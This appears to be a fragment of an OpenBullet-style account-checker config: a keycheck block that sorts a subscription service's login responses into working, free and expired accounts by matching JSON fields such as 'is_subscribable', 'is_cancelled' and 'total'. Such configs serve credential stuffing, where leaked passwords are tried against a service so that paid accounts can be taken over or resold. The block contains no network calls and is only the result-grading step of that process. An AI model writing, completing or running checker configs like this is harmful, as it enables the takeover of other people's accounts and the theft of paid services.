  KEYCHAIN Success OR 
    KEY "<Escanor>" Contains "\"is_subscribable\":true," 
    KEY "<Escanor>" Contains "\"is_active\":true" 
    KEY "<GOGETA>" GreaterThan "<VEGITO>" 
  KEYCHAIN Custom "FREE" OR 
    KEY "<BankaiMinazuki>" Contains ",\"total\":0," 
    KEY "<BankaiMinazuki>" Contains "\"items\":[]" 
    KEY "\"Subscription Not Found\"" 
    KEY "<Unohana Retsu>" EqualTo "0" 
    KEY "\"containerType\":\"free\",\"latestInvoice\":null}" 
  KEYCHAIN Custom "EXPIRED" OR 
    KEY "<GOGETA>" LessThan "<VEGITO>" 
    KEY "<Escanor>" Contains "\"is_cancelled\":true" 
